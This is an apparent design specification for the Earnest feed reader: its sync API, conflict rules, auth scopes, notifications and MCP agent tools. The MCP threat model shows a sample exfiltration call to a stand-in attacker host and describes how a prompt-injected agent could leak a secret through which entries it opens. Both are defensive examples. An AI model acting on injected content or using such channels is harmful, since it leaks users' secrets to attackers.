# API

Everything here is a proposal for the next phase. The sync model has been through four rounds of attack and has not been implemented. Treat it as a draft specification: step 1 of the [sequence](README.md#sequence) is an executable model that settles it before any schema or client depends on it.

## Existing sync APIs

| API | Auth | Sync | Flaws | Clients |
| --- | --- | --- | --- | --- |
| [Google Reader](https://freshrss.github.io/FreshRSS/en/developers/06_GoogleReader_API.html) (FreshRSS, [Miniflux](https://miniflux.app/docs/google_reader.html), [Inoreader](https://www.inoreader.com/developers/)) | ClientLogin password, permanent token | Stream IDs, continuation, `edit-tag` | No canonical spec, implementations diverge, no tombstones | Largest set: NetNewsWire, Capy Reader, Read You, Reeder Classic |
| [Fever](https://freshrss.github.io/FreshRSS/en/developers/06_Fever_API.html) | `md5(email:password)` | `since_id`, full ID lists | Weak credential, no feed management | Older clients |
| [Feedbin v2](https://github.com/feedbin/feedbin-api) | HTTP Basic | Pages, `since`, ETags | Account password, no deletion feed | NetNewsWire, Reeder, others |
| [Miniflux v1](https://miniflux.app/docs/api.html) | Per-app token | Offset lists; incremental polling with `changed_after`, plus [new-entry webhooks](https://miniflux.app/docs/webhooks.html) | No durable change log | Few native |
| [Microsub](https://indieweb.org/Microsub-spec) | IndieAuth | Channels, cursors | Draft, tiny base | Worth reading: channels resemble cadences |

Among popular feed-sync APIs, none found has a durable change feed with tombstones and a notion of who acted. Earnest needs its own native API, and should be compatible only where that buys something.

**Compatibility.** A documented Google Reader subset makes Earnest usable through existing clients before Earnest has any, and they can serve as your Mac and phone clients for months. Define it by what clients actually call, not by what the old API offered. [NetNewsWire](https://github.com/Ranchero-Software/NetNewsWire/blob/main/Modules/Account/Sources/Account/ReaderAPI/ReaderAPICaller.swift) and [Capy Reader](https://github.com/jocmp/capyreader/blob/main/readerclient/src/main/java/com/jocmp/readerclient/GoogleReader.kt) both use:

`ClientLogin`, `token`, `tag/list`, `rename-tag`, `disable-tag`, `subscription/list`, `subscription/edit`, `subscription/quickadd`, `stream/items/ids`, `stream/items/contents`, `edit-tag`. NetNewsWire also uses `subscription/import`.

Neither calls `unread-count`, `mark-all-as-read` or `stream/contents`, so add those only when a client needs them. Things to get right:

- They sync read state by pushing per-item `edit-tag` and pulling the complete unread ID set (`stream/items/ids` with `xt=read`), diffed locally. Capy asks for 10,000 IDs at a time, with continuation.
- Per the client source as read by one reviewer, item IDs are `tag:google.com,2005:reader/item/%016x` two's-complement 64-bit, and NetNewsWire expects 304s on `subscription/list` and `tag/list`.
- Capy writes per-item user labels through `edit-tag`, so Earnest needs an entry-label resource.

Write it fresh against the service layer. Miniflux's handler is a useful reference for quirks, not code to adapt: it [imports 13 internal packages](https://github.com/miniflux/v2/blob/main/internal/googlereader/handler.go) and assumes the status column Earnest replaces. Skip Fever. Skip Feedbin's API unless a client you want needs it.

The compatibility credential is a separate password limited to what these clients need: read, state and subscription edits.

## Native API

`/v1`, JSON, `application/problem+json` per [RFC 9457](https://www.rfc-editor.org/rfc/rfc9457), cursor pagination, additive within a version. Every mutation takes a client-generated `op_id`, stored long enough to outlast any offline queue.

### Resources

| Resource | Notes |
| --- | --- |
| `feed` | URL, cache validators, health. Public feeds are shared across users. **Feeds with credentials are private to their owner**: never deduplicated across users, partitioned in clusters and retrieval |
| `subscription` | User-specific: title override, folder, tags, **cadence**, full-text mode, credentials reference |
| `entry` | Immutable identity plus **`seq`**, a server ingest sequence. Publisher dates are for display only |
| `content` | Versioned by `content_hash`, separate from `entry` so lists stay small |
| `entry_state` | Per **principal** per entry: three registers, see below |
| `position` | Per principal per view: where to resume. Display only |
| `label` | User labels on entries. Separate from folders, which organise subscriptions |
| `annotation` | By one principal about one or more entries: `kind`, `value`, `entry_ids`, `principal`, `model`, `prompt_version`. Plain text only. A **brief** is an annotation over many entries, shown at the top of Today |
| `principal` | You, an agent, or the internal pipeline |
| `token` | Belongs to a principal: scopes, audience, **feed allowlist**, budget, expiry, last used |
| `proposal` | Something an agent wants and you must approve, such as a new subscription |
| `notification` | Sender, agent's note, server-generated facts, entry links, status |
| `device` | Push registration: transport, endpoint, keys |
| `webhook` | [Standard Webhooks](https://github.com/standard-webhooks/standard-webhooks/blob/main/spec/standard-webhooks.md) signing. Created by you only |
| `activity` | Immutable log of every mutation by a non-human principal |
| `change` | Per-user change log |

### Entry identity and ordering

`entry.seq` is assigned at first ingest, so **the river, resume positions and bulk operations order by `seq`, and decay ages from `first_seen_at`.** Never use `published_at` for those. A feed in backoff that delivers yesterday's posts at 18:00 must still surface them, and a feed dating its posts in 2030 must not sit at the top forever. Publisher dates are shown, not trusted.

Fetching and parsing happen outside the transaction. `seq` comes from a counter row updated in a short commit step, so visible order matches commit order and one slow feed can't stall others.

### State

An early draft used per-subscription watermarks plus sparse exceptions. Review found eight concrete failure modes, and the argument for it (cheap mark-all) is weak at this scale. Instead, **per-entry rows are the truth**, and absence means unseen. 5M rows over five years is unremarkable for Postgres. Storage says nothing about whether the UI shows counts.

Each `(principal, entry)` has three independent registers:

| Register | Values | Meaning |
| --- | --- | --- |
| `seen` | seen, unseen | Have I looked at this? Scrolling past sets it passively. Marking it unread sets it deliberately |
| `shelf` | none, later, done | What have I decided? |
| `kept` | true, false | Keep this. Independent, so starring a Later item doesn't lose its place |

**Unread** means `seen` is unseen and `shelf` isn't done. Each write records `rev`, `occurred_at`, `actor` and `source`.

**Conflict policy.** A write carries `base_rev`, the register revision the client last saw.

1. `base_rev` is current: apply.
2. Stale, so another device wrote in between. Rank by source: **your deliberate action, then a rule or agent, then passive**, whatever the clocks say.
3. Same rank: the later `occurred_at` wins, then the higher `rev`. Two passive writes resolve to `seen`.
4. The response returns the effective state and the client adopts it.

**Clocks.** `occurred_at` is `min(client value, receipt time)`, and values more than 24 hours ahead become receipt time. Old values are kept, since an old timestamp loses ties, which is correct. Promoting them to "now" would let a stale queue overwrite newer decisions. A slow clock can lose a tie between two deliberate actions. That's accepted and pinned in a test vector.

**Outbox.** Clients coalesce queued writes per register per entry, so one device's successive actions can't conflict with each other. Operations older than a maximum queue age (default 30 days) are rejected as `expired`, and the client reports what it dropped. Client state is always server state plus an overlay of pending writes.

**`POST /v1/state:batch`** takes a list of `{op_id, entry_id, register, value, base_rev, occurred_at, source}`. It isn't atomic. Each item gets a result: `applied`, `superseded` (with the effective state), `gone` (entry deleted; the client drops the write) or `expired`. A repeated `op_id`, scoped to the principal, returns the current state without re-entering conflict resolution.

**Scrolling marks only what was rendered.** A filtered view must never imply that excluded entries were seen, so **a position is never a read claim**. Positions are last-writer-wins per principal per view.

**Bulk.** `POST /v1/state:through` with a scope (subscription, folder, all) and a `through_seq`. The server resolves the scope, applies the conflict policy per entry, materialises rows in chunks, and writes one range record carrying **the resolved result**: the subscription IDs and an `except` list of entries it left alone, such as a newer deliberate unread. Clients apply that result and never re-derive it. Nothing above `through_seq` changes.

**Clusters.** `cluster` is accepted as a scope, resolved to member entries at write time. That covers duplicates already ingested. A duplicate arriving next week needs read-time suppression in the view, which belongs with clustering at step 10.

**Google Reader mapping.** Writes have no timestamps, so receipt time is used. A client back after a week offline can send thousands of `edit-tag` marks, which must not outrank what you decided natively that week.

| Google Reader | Earnest |
| --- | --- |
| add `read` | `seen = seen`, **passive** |
| remove `read`, or add `kept-unread` | `seen = unseen`, deliberate, and `shelf = none` if it was done |
| add or remove `starred` | `kept` |
| reading `read` | `seen = seen` or `shelf = done` |
| `user/-/label/x` via `edit-tag` | `label` |
| `mark-all-as-read`, if a client ever needs it | `state:through`; `ts` becomes the highest `seq` first seen by that time |

`read` must not map to `done`. A mid-list "mark read" from a third-party client would otherwise land in your Done pile and your end-of-session summary.

**Agents have their own state.** Reading never changes state. An agent tracks its progress with its own `seen` rows and position. Writing your state requires a separate scope, is logged, and can be reverted only if nothing has changed since.

### Change feed

```http
GET /v1/changes?cursor=c_9f3a&limit=200
```
```json
{
  "changes": [
    {"rev": 1042, "type": "entry.created", "id": "e_8813", "seq": 90211, "subscription_id": "s_12"},
    {"rev": 1043, "type": "state.updated", "entry_id": "e_8710", "register": "shelf",
     "value": "done", "by": "p_me", "state_rev": 7},
    {"rev": 1044, "type": "state.range", "subscriptions": ["s_3"], "through_seq": 90100,
     "except": ["e_90077"], "by": "p_me"},
    {"rev": 1045, "type": "entry.updated", "id": "e_8700", "content_hash": "b3f1"},
    {"rev": 1046, "type": "entry.deleted", "id": "e_1102"},
    {"rev": 1047, "type": "subscription.deleted", "id": "s_9"}
  ],
  "next_cursor": "c_1047",
  "has_more": false
}
```

The protocol, because a change feed without bootstrap and recovery isn't sync:

- **Serial revisions.** A plain sequence can expose 105 before 104 commits, and a reader advancing past 105 loses 104 for good. Assign `rev` by updating a per-user counter row inside the mutation transaction. [Row locks are held until transaction end](https://www.postgresql.org/docs/18/explicit-locking.html), which serialises one user's writes. Take counter locks in user ID order so concurrent ingests can't deadlock. The mutation, its change row and any delivery jobs commit atomically.
- **Compact events.** A batch of 2,000 marks is one list-valued `state.updated`, not 2,000 rows.
- **Bootstrap.** Read the current cursor *first*. Then page through every resource by stable ID: subscriptions, folders, positions, labels, annotations, and state and entries in the window the client caches. Replace the local cache, keeping the higher `rev` per object. Then replay changes from the cursor, ignoring IDs that no longer exist, and apply the outbox overlay.
- **Tombstones.** Every kind of removal appears in the log: `entry.deleted` for retention, `annotation.deleted`, `subscription.deleted`, `token.revoked`. Entries deleted before their bodies were fetched return `404`, which the client treats as a tombstone.
- **Expiry.** A cursor older than log retention returns `410 Gone`. The client re-bootstraps and then replays its outbox.
- **Restore.** Restoring a backup rotates a database generation ID, which every cursor and `base_rev` embeds. Anything from an older generation resolves to `410` or a re-read, because revisions get reused after a restore.
- **Irreversible actions.** A restore also forgets what was delivered. So notifications are **at most once**: record the attempt before sending, never retry an attempt with an unknown outcome, and show it as uncertain in the activity log. After a restore, undelivered notifications are withheld until you release them.
- **Bodies on demand.** `entry.created` carries IDs. Clients fetch `GET /v1/entries?ids=` in batches, and only for what they cache, so a device away for a month isn't handed 90,000 bodies.

**Test vectors to start from.** Language-neutral fixtures, run by the server and every client in CI. Some expected results are still decisions to make while building the model.

1. Mark-all with a newer deliberate unread in scope: the range record's `except` keeps it unread everywhere.
2. A 29-day-old queued mark-all doesn't beat newer deliberate unreads. A 31-day-old one is `expired`.
3. Queued write to a retention-deleted entry: `gone`, no resurrection.
4. Passive seen against deliberate unseen, both stale: unseen wins whatever the clocks say.
5. Two deliberate writes with the same `occurred_at`: higher `rev` wins.
6. A backdated entry ingested during mark-all (`seq` above `through_seq`) stays unread.
7. A future-dated entry doesn't stay on top; decay runs from `first_seen_at`.
8. Cursor past retention: `410`, re-bootstrap, outbox replays each operation once.
9. Restore from backup: old generation resolves to `410`, and old `base_rev` values never falsely match.
10. Notification accepted, delivered, response lost, restore, replay: not delivered twice.
11. Concurrent ingests on a shared feed with two subscribers: no deadlock, gapless `rev` per user.
12. 2,000 Google Reader marks after a week offline against native deliberate unreads: the unreads survive.
13. Bootstrap racing a range record: replay reaches the same state as a client that never went away.
14. A slow ingest transaction never exposes a higher `seq` before a lower one.
15. Repeated `op_id` after re-bootstrap returns current state and doesn't re-enter conflict resolution.
16. Mark unread through Google Reader on a Done item: it's unread, on a later read, and not Done.
17. Star then unstar a Later item: still Later.
18. Late-joining cluster member after a cluster-scoped done: expected result documented.
19. Restore to a point before a notification was accepted, then replay it. The restored database has neither the notification nor its `op_id`, so holding pending rows can't catch this. Generation checks must cover notification requests too.
20. Google Reader has no `base_rev` or action time. Fresh read after a native deliberate unread; stale unread, star and unstar. Record the unavoidable trade-off.
21. Bootstrap already holds newer per-register state when an older range replays. A crash between bulk chunks.

The model is allowed to reject these mechanisms, including restore handling and the compatibility conflict policy. At-most-once delivery alone doesn't solve vector 19.

**Open after round 9.** [The ninth review](raw/r6-sync.md) found these undecided or contradictory. [All are now decided](decisions.md#sync):

- `state:batch` isn't atomic, yet a batch becomes one compact `state.updated`, which must commit with its mutation. Otherwise a write landing mid-batch can leave a replaying client different from the server. One event per item, or resolve the batch atomically before compacting.
- Bootstrap keeps "the higher `rev` per object", but no resource carries one. Each bootstrapped object needs its last change-log `rev`, and state its `state_rev`.
- Labels are written through Google Reader and bootstrapped, but have no native endpoints, change events or tombstones.
- Positions are last-writer-wins but have no change event, so they cross devices only at bootstrap. Add `position.updated`, or say so.
- A range record names subscriptions, so it can't express a cluster scope.
- Mark unread on a Done item resets `shelf` through Google Reader (vector 16) but not natively, where a batch item writes one register. Either the server resets `shelf`, or the client sends both writes.
- The lock order covers per-user counters, not the `seq` counter an ingest also updates.
- Google Reader's `mark-all-as-read` has no rule for a missing `ts`. Plausible, not confirmed.
- What `/v1/changes` returns to an agent token: its allowlist only, with filtered events still advancing the cursor, or nothing.

### Endpoints

```
Identity    GET /v1/me · GET,POST /v1/tokens · DELETE /v1/tokens/{id}
Feeds       GET,POST /v1/subscriptions · GET,PATCH,DELETE /v1/subscriptions/{id}
            POST /v1/subscriptions/{id}/refresh · POST /v1/discover
            GET /v1/feeds/{id}/health · POST /v1/opml:import · GET /v1/opml
Folders     GET,POST /v1/folders · PATCH,DELETE /v1/folders/{id}
Entries     GET /v1/entries · GET /v1/entries/{id} · GET /v1/entries/{id}/content
            GET /v1/search
State       POST /v1/state:batch · POST /v1/state:through · GET,PUT /v1/positions/{view}
Annotations GET,PUT,DELETE /v1/entries/{id}/annotations/{kind}
Proposals   GET,POST /v1/proposals · POST /v1/proposals/{id}:approve|:reject
Sync        GET /v1/changes · GET /v1/events (SSE)
Notify      POST,GET /v1/notifications · POST /v1/notifications/{id}:cancel
            GET,POST /v1/devices · DELETE /v1/devices/{id}
Activity    GET /v1/activity · POST /v1/activity/{id}:revert
Hooks       GET,POST /v1/webhooks · PATCH,DELETE /v1/webhooks/{id}
Export      GET /v1/export (entries, annotations, saved items)
Compat      /api/greader/...
Agents      /mcp · /llms.txt · /openapi.json
```

### Auth

| Kind | Mechanism | Used by |
| --- | --- | --- |
| Session | Cookie with CSRF protection | Web client only |
| App token | Device-flow login ([RFC 8628](https://www.rfc-editor.org/rfc/rfc8628)), kept in Keychain or Android Keystore | Mac, Android, CLI |
| Agent token | Created in the CLI or UI with a name, scopes, feed allowlist, budget and expiry | MCP and REST agents |
| Compat password | Read, state, subscription edits | Google Reader clients |
| OAuth 2.1 with PKCE | Only with public access | Cloud-hosted LLM clients |

Tokens are at least 128 bits of randomness, stored as a SHA-256 hash, compared in constant time, with an audience (`api` or `mcp`). [MCP servers must not accept tokens not issued for them](https://modelcontextprotocol.io/specification/2026-07-28/basic/security_best_practices).

**Agent scopes.** `entries:read` (limited to the feed allowlist), `annotations:write`, `position:own`, `notify:send`, `proposals:write`, `state:write-human`, `notify:urgent`. Agent tokens can **never** hold `feeds:write`, `webhooks:write`, token management or `admin`, and **no agent scope can trigger a fetch**, including `refresh`. Scopes are enforced in the service layer, so the same limits apply over REST, CLI and MCP.

### Realtime

SSE at `/v1/events` with `Last-Event-ID` for clients. It only hints: clients react by reading `/v1/changes`, so there is one source of truth. Skip WebSocket. Webhooks for automation: `feed.failing`, `edition.ready`, and `entry.matched` once rules exist. You create webhooks, never an agent. Destinations go through the same outbound rules as all fetching, with no redirects.

### Sending a notification

```http
POST /v1/notifications
Authorization: Bearer earnest_agent_...

{
  "op_id": "01JC8Z...",
  "note": "CVE in rustls. Affects a crate you follow.",
  "entry_ids": ["e_8813"],
  "category": "alert",
  "dedupe_key": "rustls-cve-2026-1234"
}
```
```http
202 Accepted
{"id": "n_551", "status": "held", "held_until": "2026-11-02T07:00:00+01:00",
 "budget": {"used_today": 1, "limit_today": 3}}
```

Rules, enforced on the server:

- **Agent text never enters a push payload by default.** APNs and FCM [carry payloads in the clear unless the app encrypts them](https://developer.apple.com/documentation/usernotifications/generating-a-remote-notification), so `title` and `note` would otherwise be an agent-controlled path to third parties. The payload is server-generated, such as "Morning Agent: 1 alert", plus an ID, with no icon, attachment or action URLs, because [clients fetch those automatically](https://docs.ntfy.sh/publish/#icons). The app fetches the rest over the tailnet on open. Showing text on the lock screen is an opt-in, per transport, and safest on encrypted ones ([Web Push and UnifiedPush use RFC 8291](https://unifiedpush.org/users/faq/)) or a self-hosted, default-deny ntfy ([topics are effectively passwords](https://docs.ntfy.sh/publish/)).
- **Provenance is generated, not supplied.** The server states the sender, its budget and any matching rule. The agent's `note` is displayed as the agent's words, never inside the "why" block.
- **No caller-supplied URLs.** Tapping opens the entry inside Earnest. `earnest://` links accept internal IDs only.
- **Closed categories.** Server-defined, with agent notifications in that agent's own Android channel, so an agent can't mint channels or raise its own importance.
- `dedupe_key` is namespaced per principal, so an agent can't swallow your rule's notifications.
- Plain text with length limits. Per-token daily budget, dedupe window, quiet hours. Over budget returns `429` with the budget in the problem body. Held is not lost.
- `notify:urgent` bypasses quiet hours only, stays within budget, and isn't granted by default.
- **A delivered notification can't be undone.** It can be cancelled while held, and you can mute the agent.

## MCP

Current revision is [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/changelog). What a server must do:

- Stateless: no sessions or `initialize`, `server/discover` required, per-request protocol version and capabilities in `_meta`, `resultType` on every result.
- Required `Mcp-Method` and `Mcp-Name` headers, and `Origin` validation.
- `ttlMs` and `cacheScope` on list and read results. Always `cacheScope: private` here.
- Deterministic tool ordering.
- **Sampling, Roots and Logging are deprecated**, so don't plan on asking the client's model to summarise through Sampling.
- Dynamic Client Registration is deprecated in favour of Client ID Metadata Documents. Relevant only with OAuth.
- `subscriptions/listen` replaces `resources/subscribe`. Don't depend on client support.
- Transport resumability is gone: a broken stream loses the request, and the client re-issues it with a new JSON-RPC ID.
- [Handles are not authentication](https://modelcontextprotocol.io/specification/2026-07-28/basic/security_best_practices). Cursors and revert handles are 128-bit random, bound server-side to the principal, and they expire.

**Retries are Earnest's problem.** The spec has no operation ID, and a new JSON-RPC ID can't prevent a duplicate notification, so **mutating tools take a stable `operation_id`**, as every native mutation takes an `op_id`.

[Go SDK v1.7 and later support this revision](https://github.com/modelcontextprotocol/go-sdk/releases/tag/v1.7.0), and only when `StreamableHTTPOptions.Stateless` is true. Otherwise clients silently negotiate down.

**Tools.** They call the service layer, so no rule is implemented twice. But don't mirror endpoints one for one: 40 tools waste an agent's context. Start with reading and the agent's own output, and add mutations when a real workflow needs them.

| Tool | Scope | Side effect | Does |
| --- | --- | --- | --- |
| `get_briefing` | entries:read | None | What's new since this agent's position, grouped by cadence, and by cluster once those exist. Titles and IDs by default |
| `list_entries` | entries:read | None | Filtered listing, compact fields, bounded page size |
| `read_entry` | entries:read | None | One entry's **already stored** content, marked untrusted. Never triggers extraction or any fetch |
| `search` | entries:read | None | Full-text search with snippets; hybrid once embeddings exist |
| `list_feeds` | entries:read | None | Allowed subscriptions, cadence, health |
| `advance_position` | position:own | Own state | Move this agent's own position |
| `annotate` | annotations:write | Own output | Write a note, label, score or brief, over one or more entries. Plain text |
| `notify` | notify:send | **Irreversible once delivered** | Send within budget. Agent text stays out of the push payload |

Add when needed: `propose_subscription`, which records a proposal and **fetches nothing until you approve**; `triage`, which changes your state and returns a revert handle; `revert`, which only works on that principal's own actions and only if the affected register is unchanged.

Annotate each tool with accurate `readOnlyHint`, `destructiveHint` and `idempotentHint`. They are hints for the client, not authorisation.

**Invariant.** *No agent-reachable operation may cause an outbound request to a URL influenced by agent input, directly or indirectly.* `subscribe("https://attacker.example/?secret=...")` would turn Earnest into an exfiltration channel. So would on-demand extraction: an attacker publishes entries with different URLs, and an injected agent encodes a secret in which entries it opens. Hence reads are stored content only. The full threat model is in [llm.md](llm.md#safety). Test this directly.

**Transport and auth.** Streamable HTTP at `/mcp`, bearer agent token with audience `mcp`, on the tailnet. OAuth only with public access.

**Also ship.** An `earnest` CLI over the same API, since many agents use a CLI more readily than MCP. `/llms.txt` and a markdown API guide. An [agent skill](https://agentskills.io) file. All cheap.
